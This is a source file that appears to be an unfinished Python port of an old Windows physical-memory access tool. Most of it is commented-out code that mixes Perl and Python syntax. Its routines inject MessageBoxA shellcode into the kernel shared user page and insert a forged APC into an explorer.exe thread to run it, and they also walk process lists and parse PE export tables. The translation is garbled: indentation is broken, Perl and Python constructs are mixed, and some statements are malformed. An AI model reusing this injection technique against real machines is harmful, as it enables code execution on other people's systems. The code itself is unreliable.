# Copyright (C) 2007 SecureWorks, Inc.
# Copyright (C) 2013 espes
# Copyright (C) 2017 Jannik Vogel
#
# This program is free software subject to the terms of the GNU General
# Public License.  You can use, copy, redistribute and/or modify the
# program under the terms of the GNU General Public License as published
# by the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version. You should have received a copy of
# the GNU General Public License along with this program.  If not,
# please see http://www.gnu.org/licenses/ for a copy of the GNU General
# Public License.
#
# The program is subject to a disclaimer of warranty and a limitation of
# liability, as disclosed below.
#
# Disclaimer of Warranty.
#
# THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
# APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
# HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT
# WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
# PARTICULAR PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE
# OF THE PROGRAM IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU
# ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR, CORRECTION OR
# RECOVERY FROM DATA LOSS OR DATA ERRORS.
#
# Limitation of Liability.
#
# IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
# WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR
# CONVEYS THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES,
# INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES
# ARISING OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT
# NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES
# SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE
# WITH ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN
# ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.


# def injectSUSShellcode(title, message):
#     userbase  = 0x7ffe0800
#     ring0base = 0xffdf0800
#     save      = $pcontext
#     $pcontext = \%kernelcontext;    # this procedure is kernel context only
#     messageboxa = getProcAddress( "user32.dll", "MessageBoxA" )
#
#     sc =
#         "\x6a\x00\x68\x00\x00\x00\x00\x68\x00\x00\x00\x00\x6A\x00\xE8\x00\x00\x00\x00\xc3$title\x00$message\x00"
#     substr( $sc, 3,  4 ) = pack( "I", $userbase + 20 )
#     substr( $sc, 8,  4 ) = pack( "I", $userbase + 21 + len($title) )
#     substr( $sc, 15, 4 ) = pack( "I", $messageboxa - ( $userbase + 19 ) )
#
#     writeVirtualMemory( $ring0base, $sc )
#     printf "Shellcode injected at %08x (%08x)\n", $ring0base, $userbase
#     $pcontext = $save

# def insertApc:
#     print "Searching for thread in explorer.exe\n"
#     my %procs = getProcessList()
#     thread
#     for ( sort keys %procs ):
#         n = lc( $procs{$_}{'name'] )
#         print "Found $n\n"
#         if ( $n == "explorer.exe" ):
#
#             #printf "Found explorer.exe\n"
#             $thread = shift( @{ $procs{$_}{'threads'] } )
#             last
#                 unless ($thread):
#         print "Failed to find thread\n"
#         return
#         printf "Using thread object at %08x\n", $thread
#     kernelret = findRet()
#     shellcode = 0x7ffe0800
#     apc       = "\x00" x 48
#     putme     = 0xffdf0900
#     save      = $pcontext
#     $pcontext = \%kernelcontext;    # this procedure is kernel context only
#     substr( $apc, 0,  2 ) = pack( "S", 0x12 );       # type = Apc object
#     substr( $apc, 2,  2 ) = pack( "S", 0x30 );       # size of object = 48 bytes
#     substr( $apc, 8,  4 ) = pack( "I", $thread );    # ethread ptr
#     substr( $apc, 20, 4 ) = pack( "I", $kernelret ); # ret command in kernel
#     substr( $apc, 28, 4 ) = pack( "I", $shellcode ); # shellcode vaddr
#     substr( $apc, 36, 4 ) = pack( "I", $putme + 0x50 );    # system arg 1
#     substr( $apc, 40, 4 ) = pack( "I", $putme + 0x54 );    # system arg 2
#     substr( $apc, 46, 1 ) = "\x01";    # Apc mode = user mode
#     substr( $apc, 47, 1 ) = "\x01";    # Inserted = true (well, it will be)
#
#     printf "Built APC object for thread at %08x\n", $thread
#
#     #print hexformat($apc)
#     printf "Inserting into APC list at %08x\n", $thread + 0x3c
#     oldflink = readDword( $thread + 0x3c )
#     printf "Replacing old Apc flink: %08x\n", $oldflink
#     if ( $oldflink != "failed" ):
#         substr( $apc, 12, 4 ) = pack( "I", $oldflink );         # flink
#         substr( $apc, 16, 4 ) = pack( "I", $thread + 0x3c );    # blink
#
#         # write APC object to SharedUserSpace
#         writeVirtualMemory( $putme, $apc )
#
#         # insert our APC into the list
#         writeVirtualMemory( $thread + 0x3c, pack( "I", $putme + 12 ) )
#
#         # set UserApcPending = TRUE
#         writeVirtualMemory( $thread + 0x4a, "\x01" )
#         printf "Inserted APC into thread at %08x\n", $thread
#         else:
#         print "Failed to insert APC\n"
#         $pcontext = $save

# def parsePE:
#
#     # Some PE parsing code borrowed from Metasploit PE module
#     my %pe_hdr
#     crap
#     base = shift
#     data = readVirtualMemory( $base, 0x800 )
#     $data += readVirtualMemory( $base + 0x800, 0x800 )
#
#     #printf "Read %d bytes of PE header at %08x\n", len($data),$base
#     return unless len($data) == 0x1000
#
#     return unless substr( $data, 0, 2 ) == "MZ"
#     peo = unpack( "I", substr( $data, 0x3c, 4 ) )
#     return unless substr( $data, $peo, 2 ) == "PE"
#
#     pe_hdr["MachineID"]            = unpack( "S", substr( $data, $peo + 4 ) )
#     pe_hdr["NumberOfSections"]     = unpack( "S", substr( $data, $peo + 6 ) )
#     pe_hdr["TimeDateStamp"]        = unpack( "L", substr( $data, $peo + 8 ) )
#     pe_hdr["PointerToSymbolTable"] = unpack( "L", substr( $data, $peo + 12 ) )
#     pe_hdr["NumberOfSymbols"]      = unpack( "L", substr( $data, $peo + 16 ) )
#     pe_hdr["SizeOfOptionalHeader"] = unpack( "S", substr( $data, $peo + 20 ) )
#     pe_hdr["Characteristics"]      = unpack( "S", substr( $data, $peo + 22 ) )
#
#     if ( pe_hdr["SizeOfOptionalHeader"] < 224 ):
#         return 0
#         opthdr = substr( $data, $peo + 24, pe_hdr["SizeOfOptionalHeader"] )
#     pe_hdr["Magic "]              = unpack( "S", substr( $opthdr, 0 ) )
#     pe_hdr["MajorLinker"]         = unpack( "C", substr( $opthdr, 2 ) )
#     pe_hdr["MinorLinker"]         = unpack( "C", substr( $opthdr, 3 ) )
#     pe_hdr["SizeOfCode"]          = unpack( "L", substr( $opthdr, 4 ) )
#     pe_hdr["SizeOfInitialized"]   = unpack( "L", substr( $opthdr, 8 ) )
#     pe_hdr["SizeOfUninitialized"] = unpack( "L", substr( $opthdr, 12 ) )
#
#     pe_hdr["EntryPoint"] = unpack( "L", substr( $opthdr, 16 ) )
#     pe_hdr["BaseOfCode"] = unpack( "L", substr( $opthdr, 20 ) )
#     pe_hdr["BaseOfData"] = unpack( "L", substr( $opthdr, 24 ) )
#
#     pe_hdr["ImageBase"]    = unpack( "L", substr( $opthdr, 28 ) )
#     pe_hdr["SectionAlign"] = unpack( "L", substr( $opthdr, 32 ) )
#     pe_hdr["FileAlign"]    = unpack( "L", substr( $opthdr, 36 ) )
#
#     pe_hdr["MajorOS"]    = unpack( "S", substr( $opthdr, 38 ) )
#     pe_hdr["MinorOS"]    = unpack( "S", substr( $opthdr, 40 ) )
#     pe_hdr["MajorImage"] = unpack( "S", substr( $opthdr, 42 ) )
#     pe_hdr["MinorImage"] = unpack( "S", substr( $opthdr, 44 ) )
#     pe_hdr["MajorSub"]   = unpack( "S", substr( $opthdr, 46 ) )
#     pe_hdr["MinorSub"]   = unpack( "S", substr( $opthdr, 48 ) )
#
#     pe_hdr["Reserved"]            = unpack( "L", substr( $opthdr, 52 ) )
#     pe_hdr["SizeOfImage"]         = unpack( "L", substr( $opthdr, 56 ) )
#     pe_hdr["SizeOfHeaders"]       = unpack( "L", substr( $opthdr, 60 ) )
#     pe_hdr["Checksum"]            = unpack( "L", substr( $opthdr, 64 ) )
#     pe_hdr["Subsystem"]           = unpack( "S", substr( $opthdr, 68 ) )
#     pe_hdr["DllCharacteristics"]  = unpack( "S", substr( $opthdr, 70 ) )
#     pe_hdr["SizeOfStackReserve"]  = unpack( "L", substr( $opthdr, 72 ) )
#     pe_hdr["SizeOfStackCommit"]   = unpack( "L", substr( $opthdr, 76 ) )
#     pe_hdr["SizeOfHeapReserve"]   = unpack( "L", substr( $opthdr, 80 ) )
#     pe_hdr["SizeOfHeapCommit"]    = unpack( "L", substr( $opthdr, 84 ) )
#     pe_hdr["LoaderFlags"]         = unpack( "L", substr( $opthdr, 88 ) )
#     pe_hdr["NumberOfRvaAndSizes"] = unpack( "L", substr( $opthdr, 92 ) )
#
#     my @RVAMAP = qw(export import resource exception certificate basereloc
#       debug archspec globalptr tls load_config boundimport importaddress
#       delayimport comruntime none)
#
#     # parse the rva data
#     rva_data = substr( $opthdr, 96, pe_hdr["NumberOfRvaAndSizes"] * 8 )
#     my %RVA
#     for x in range(0, pe_hdr{"NumberOfRvaAndSizes"):
#         if ( !$RVAMAP[$x] ) { $RVAMAP[$x] = "unknown_$x"         $RVA{ $RVAMAP[$x] } = [
#             unpack( "L", substr( $rva_data, ( $x * 8 ) ) ),
#             unpack( "L", substr( $rva_data, ( $x * 8 ) + 4 ) ),
#         ]
#
#     # parse the section headers
#     sec_begn = $peo + 24 + pe_hdr["SizeOfOptionalHeader"]
#     sec_data = substr( $data, $sec_begn )
#
#     for x in range(0, pe_hdr{"NumberOfSections"):
#         sec_head = $sec_begn + ( $x * 40 )
#         sec_name = substr( $data, $sec_head, 8 )
#         $sec_name =~ s/\x00//g
#         if ( $sec_name == "" ) { $sec_name = ".sec$x"
#         #sec_name = ".sec$x"
#         vsize   = unpack( "L", substr( $data, $sec_head + 8 ) )
#         voffset = unpack( "L", substr( $data, $sec_head + 12 ) )
#         rsize   = unpack( "L", substr( $data, $sec_head + 16 ) )
#         roffset = unpack( "L", substr( $data, $sec_head + 20 ) )
#         if ( $voffset == pe_hdr["BaseOfCode"] ):
#           $type = "CODE"
#         elsif ( $voffset == pe_hdr["BaseOfData"] ):
#           $type = "DATA"
#         else:
#           $type = "UNKNOWN"
#     pe_hdr['import']     = $RVA{'import']->[0]
#     pe_hdr['export']     = $RVA{'export']->[0]
#     pe_hdr['importsize'] = $RVA{'import']->[1]
#     pe_hdr['exportsize'] = $RVA{'export']->[1]
#     return %pe_hdr

# def getImports:
#     base    = shift;    # base address of module
#     ioffset = shift;    # offset to import table
#     size    = shift;    # size of import table
#     crap
#
#     imports = readVirtualMemory( $base + $ioffset, $size )
#
#     for ( i = 0 ; $i < $size ; $i += 20 ):
#         last if substr( $imports, $i, 20 ) == "\x00" x 20
#         rvaILT         = unpack( "L", substr( $imports, $i,      4 ) )
#         timestamp      = unpack( "L", substr( $imports, $i + 4,  4 ) )
#         forwarderchain = unpack( "L", substr( $imports, $i + 8,  4 ) )
#         rvaModuleName  = unpack( "L", substr( $imports, $i + 12, 4 ) )
#         rvaIAT         = unpack( "L", substr( $imports, $i + 16, 4 ) )
#         modname = readVirtualMemory( $base + $rvaModuleName )
#         $modname =~ s/\x00.*//
#
#         if ($rvaILT):
#             count = 0
#             ibuf = readVirtualMemory( $base + $rvaILT, 4 )
#           IGRAB: while ( $ibuf != "\x00\x00\x00\x00" ):
#                 importthunkRVA = unpack( "L", $ibuf )
#                 last IGRAB if $importthunkRVA == 0
#
#                 if ( $importthunkRVA & 0x8000000 ):
#                     printf "ORD: 0x%x\n", $importthunkRVA & ~0x80000000
#                                 else:
#                     importname =
#                       readVirtualMemory( $importthunkRVA & ~0x80000000, 255 )
#                     $importname = substr( $importname, 2 )
#                     ( $importname, $crap ) = split( /\x00/, $importname )
#                     thunk = $base + $rvaIAT + ( $count * 4 )
#                     my ( $mod, $suff ) = split( /\./, lc($modname) )
#                     printf "%s (0x%x)\n", $importname, $thunk
#                                 $count++
#                 $ibuf =
#                   readVirtualMemory( $base + ( $rvaILT + $count * 4 ), 4 )
#             }    # end while
#         }    # end if rvaILT
#         else:
#             count = 0
#             ibuf = readVirtualMemory( $base + $rvaIAT, 4 )
#           IGRAB: while ( $ibuf != "\x00\x00\x00\x00" ):
#                 importthunkRVA = unpack( "L", $ibuf )
#                 last IGRAB if $importthunkRVA == 0
#                 importname =
#                   readVirtualMemory( $base + $importthunkRVA, 255 )
#                 $importname = substr( $importname, 2 )
#                 ( $importname, $crap ) = split( /\x00/, $importname )
#                 thunk = $base + $rvaIAT + ( $count * 4 )
#                 my ( $mod, $suff ) = split( /\./, lc($modname) )
#                 printf "%s (0x%x)\n", $importname, $thunk
#
#                 $count++
#                 $ibuf = readVirtualMemory( $base + $rvaIAT, 4 )
#             }    # end while
#         }    # end if rvaILT
#     }    # end if import module

# def locateExportNameInTable:
#     procname = shift
#     base     = shift
#     eoffset  = shift
#     size     = shift
#     my %exp      = getExports( $base, $eoffset, $size )
#     for ( keys %exp ):
#         if ( $exp{$_} == $procname ):
#             return $_

# def getExports:
#     base    = shift
#     eoffset = shift
#     size    = shift
#     my %exportlist
#
#     return unless $base && $eoffset && $size
#     exports = readVirtualMemory( $base + $eoffset, $size )
#
#     ebase     = unpack( "I", substr( $exports, 16, 4 ) )
#     enumfuncs = unpack( "I", substr( $exports, 20, 4 ) )
#     enumnames = unpack( "I", substr( $exports, 24, 4 ) )
#     EATrva    = unpack( "I", substr( $exports, 28, 4 ) )
#     ENTrva    = unpack( "I", substr( $exports, 32, 4 ) )
#     EOTrva    = unpack( "I", substr( $exports, 36, 4 ) )
#     my ( @exportnames, @exportordinals, @exportfunctions )
#
#     # get ascii name table boundaries
#     nbegin   = readDword( $base + $ENTrva )
#     nend     = readDword( $base + $ENTrva + ( ( $enumnames - 1 ) * 4 ) )
#     lastname = readVirtualMemory( $nend + $base, 255 )
#     term     = index( $lastname, "\x00" )
#     $nend += $term
#     namebuf = readVirtualMemory( $nbegin + $base, $nend - $nbegin )
#
#     #print hexasc($namebuf)
#
#     nametable = readVirtualMemory( $ENTrva + $base, $enumnames * 4 )
#     functable = readVirtualMemory( $EATrva + $base, $enumfuncs * 4 )
#     ordtable  = readVirtualMemory( $EOTrva + $base, $enumfuncs * 2 )
#
#     for ( 0 .. $enumnames - 1 ):
#         n = unpack( "L", substr( $nametable, $_ * 4, 4 ) )
#         if ( $n >= $nbegin ):
#             ename = substr( $namebuf, $n - $nbegin, 255 )
#             $ename =~ s/\x00.*//g
#             push( @exportnames, $ename )
#
#             #printf "Adding name index %d (begins at %08x: raw %08x) %s\n",
#             #$_, $n, $n-$nbegin, $ename
#                 for ( 0 .. $enumfuncs - 1 ):
#         eord = unpack( "S", substr( $ordtable, $_ * 2, 2 ) )
#         push( @exportordinals, $eord )
#         for ( 0 .. $enumfuncs - 1 ):
#         eaddr = unpack( "L", substr( $functable, $_ * 4, 4 ) )
#         push( @exportfunctions, $eaddr )
#
#     for o ( 0 .. $#exportnames ):
#         name = $exportnames[$o]
#         ord  = $exportordinals[$o]
#         addr = $exportfunctions[$ord]
#         $name ||= $ord
#         $exportlist{ addr + $base } = $name
#         return %exportlist

# def findRet:
#     hp
#     pos
#     save = $pcontext
#     $pcontext = \%kernelcontext;    # this procedure is kernel context only
#     for ( 0 .. 100 ):
#         $hp = $_
#         buf =
#           readVirtualMemory( $kernelbase + 0x1000 + ( $hp * 0x800 ), 0x800 )
#         $pos = index( $buf, "\xc3" )
#         last unless $pos == -1
#         ret = $kernelbase + 0x1000 + ( $hp * 0x800 ) + $pos
#     printf "Found RETN instruction at %08x", $ret
#     $pcontext = $save
#     return $ret


def logical2physical(logical):
    #     pdb     = pcontext['dtb']
    #     return unless $pdb
    #     offset = $logical & 0xfff;                            # save byte offset
    #     pde    = ( $logical >> 22 ) & 0x3ff
    #     pte    = ( $logical >> 12 ) & 0x3ff
    #     buf    = readPhysicalMemory( $pdb + ( $pde * 4 ), 4 )
    #     valid  = unpack( "I", $buf ) & 0x1
    #     if ($valid):
    #         ptb = unpack( "I", $buf ) & 0xfffff000
    #
    # #printf "Seeking to PTB %08x + PTE %03x * 4 = %08x\n", $ptb, $pte, $ptb + ($pte * 4)
    #         $buf = readPhysicalMemory( $ptb + ( $pte * 4 ), 4 )
    #         $valid = unpack( "I", $buf ) & 0x1
    #         if ($valid):
    #             phys = unpack( "I", $buf ) & 0xfffff000
    #             return ( $phys | offset );    #restore byte offset
    #                 printf "Invalid PTE found for va %08x: %08x\n", $logical,
    #       unpack( "I", $buf )
    print("TODO: IMPLEMENT LOGICAL2PHYSICAL")
    return 0


# def listExports(base):
#     my %pe   = parsePE($base)
#     if ( $pe{'export'] && $pe{'exportsize'] ):
#         printf "Exports found in PE file at %08x:\n", $base
#         my %exp = getExports( $base, $pe{'export'], $pe{'exportsize'] )
#         for ( sort keys %exp ):
#             printf "%08x:%s\n", $_, $exp{$_}
#                 else:
#         print "No export table found\n"


# def getEprocess:
#     pid  = shift
#     j    = ( $pid >> 18 ) & 0xff
#     k    = ( $pid >> 10 ) & 0xff
#     l    = ( $pid >> 2 ) & 0xff
#     save = $pcontext
#     $pcontext = \%kernelcontext;    # this procedure is kernel context only
#                                     #print "Finding eprocess[$j][$k][$l]\n"
#     pspcidtable = getPspCidTable()
#
#     if ($pspcidtable):
#         subtable
#         if ( $version >= 6.0 ):
#             $subtable = readDword($pspcidtable)
#                 else:
#             table
#             ptable = readDword($pspcidtable)
#             if ( $ptable != "failed" ):
#
#                 #print("ptable: %08x\n", $ptable
#                 $table = readDword( $ptable + 8 )
#                         if ( $table != "failed" ):
#
#                 #print("table: %08x\n", $table
#                 $subtable = readDword( $table + ( $j * 4 ) )
#                             if ( ($subtable) && ( $subtable != "failed" ) ):
#
#             #print("subtable: %08x\n", $subtable
#             subsubtable = readDword( $subtable + ( $k * 4 ) )
#             if ( $subsubtable != "failed" ):
#
#                 #print("subsubtable: %08x\n", $subsubtable
#                 entry = readDword( $subsubtable + ( $l * 8 ) )
#                 if ( $entry != "failed" ):
#                     if ( $version < 6 ):
#                         $entry |= 0x80000000;    # lock bit
#                                         else:
#                         $entry &= 0xfffffffe;    # lock bit
#
#                   #print("eprocess of pid 0x%x starts at %08x\n", $pid, $entry
#                     $pcontext = $save
#                     return $entry
#                                             $pcontext = $save
#     return 0

# def getProcessList:
#     ep
#     my %prochash
#     my ( $listoffset, $pidoffset, $nameoffset, $timeoffset )
#     my ( $threadoffset, $peboffset, $dtboffset )
#     save = $pcontext
#     $pcontext = \%kernelcontext;    # this procedure is kernel context only
#     if ( $version >= 6.0 ):
#
#         # xp, vista
#         $ep           = getEprocess(4)
#         $listoffset   = 0x88
#         $pidoffset    = 0x84
#         $nameoffset   = 0x174
#         $timeoffset   = 0x70
#         $threadoffset = 0x1b0
#         $peboffset    = 0x1b0
#         $dtboffset    = 0x18
#         else:
#
#         # win2k
#         $ep           = getEprocess(8)
#         $listoffset   = 0xa0
#         $pidoffset    = 0x9c
#         $nameoffset   = 0x1fc
#         $timeoffset   = 0x88
#         $threadoffset = 0x1a4
#         $peboffset    = 0x1b0
#         $dtboffset    = 0x18
#
#     #print("System ep: %08x\n", $ep
#     unless ($ep) { $pcontext = $save; return     my @procs = walkList( $ep + $listoffset, $listoffset )
#     for eproc (@procs):
#         e = readVirtualMemory( $eproc, 0x21c )
#         if ( len($e) == 0x21c ):
#
#             #print hexformat($e)
#             name = substr( $e, $nameoffset, 16 )
#             $name =~ s/\x00//g
#             pid = unpack( "I", substr( $e, $pidoffset, 4 ) )
#             next unless ($pid) && ( $pid < 0xffff )
#             dtb = unpack( "I", substr( $e, $dtboffset, 4 ) )
#             peb = unpack( "I", substr( $e, $peboffset, 4 ) )
#             created = ft2Time( substr( $e, $timeoffset, 8 ) )
#
#             my @threads =
#               walkList( unpack( "I", substr( $e, 0x50, 4 ) ), $threadoffset )
#             if (@threads):
#                 $prochash{$eproc}{'pid']     = $pid
#                 $prochash{$eproc}{'name']    = $name
#                 $prochash{$eproc}{'created'] = $created
#                 $prochash{$eproc}{'dtb']     = $dtb
#                 $prochash{$eproc}{'peb']     = $peb
#                 @{ $prochash{$eproc}{'threads'] } = @threads
#                             $pcontext = $save
#     return %prochash

# def ft2Time:
#     ft = shift
#     return 0 unless len($ft) == 8
#     ch = 0x019db1de
#     cl = 0xd53e8000
#     lo = unpack( "I", substr( $ft, 0, 4 ) )
#     hi = unpack( "I", substr( $ft, 4, 4 ) )
#     return 0 if ( $hi < $ch ) || ( ( $hi == $ch ) && ( $lo < $cl ) )
#     return ( ( ( ( $hi * 0x10000 ) * 0x10000 ) + $lo ) -
#           ( ( ( $ch * 0x10000 ) * 0x10000 ) + $cl ) ) / 10000000

# def walkList:
#     my @ret
#     flink  = shift;    # address of LIST_ENTRY in struct
#     offset = shift;    # offset to LIST_ENTRY from beginning of struct
#     top    = $flink
#     while ( $flink != 0 ):
#         push( @ret, $flink - offset )
#         $flink = readDword($flink)
#         last if ( $flink == $top ) || ( $flink == "failed" )
#         return @ret


# def getProcAddress:
#     module   = shift
#     procname = shift
#     save     = $pcontext
#     addr
#
#     # get eprocess list, start with bottom process
#     my %procs = getProcessList()
#     for ( sort keys %procs ):
#         dtb      = $procs{$_}{'dtb']
#         peb      = $procs{$_}{'peb']
#         pid      = $procs{$_}{'pid']
#         eprocess = $_
#         next unless $peb
#         print("Searching for %s in modules of pid %x (eprocess is %08x)\n",
#           $procname, $pid, $eprocess
#
#         # set process context
#         processcontext['dtb']      = $dtb
#         processcontext['pid']      = $pid
#         processcontext['peb']      = $peb
#         processcontext['eprocess'] = $eprocess
#
#         $pcontext = \%processcontext
#
#         my %modules = getUserModules()
#         for ( sort keys %modules ):
#             if (   ( $modules{$_}{'name'] =~ /^$module$/i )
#                 || ( $modules{$_}{'name'] =~ /^$module\.dll/i ) )
#            :
#                 print("Found instance of %s at %08x\n", $module, $_
#                 my %pe = parsePE($_)
#                 addr =
#                   locateExportNameInTable( $procname, $_, $pe{'export'],
#                     $pe{'exportsize'] )
#                 goto DONEGOTPROC
#                           DONEGOTPROC:
#
#     # back to original process context
#     $pcontext = $save
#     return addr

# def getUserModules:
#     my %modules
#
#     # read PEB into buf
#     peb = pcontext['peb']
#     pebdata = readVirtualMemory( $peb, 0x300 )
#     next unless len($pebdata) == 0x300
#
#     # get module list
#     mptr = unpack( "I", substr( $pebdata, 0x0c, 4 ) )
#     modulelist = readDword( $mptr + 0x14, 4 )
#     my @modlist = walkList($modulelist)
#     for mod (@modlist):
#         buf = readVirtualMemory( $mod, 0x34 )
#         if ( len($buf) == 0x34 ):
#             base = unpack( "I", substr( $buf, 0x10, 4 ) )
#             next if $base == 0
#             entry = unpack( "I", substr( $buf, 0x14, 4 ) )
#             size = unpack( "I", substr( $buf, 0x18, 4 ) )
#             path = substr( $buf, 0x1c, 8 )
#             name = substr( $buf, 0x24, 8 )
#             $modules{$base}{'name']  = unicodeStructToAscii($name)
#             $modules{$base}{'path']  = unicodeStructToAscii($path)
#             $modules{$base}{'size']  = $size
#             $modules{$base}{'entry'] = $entry
#                 return %modules
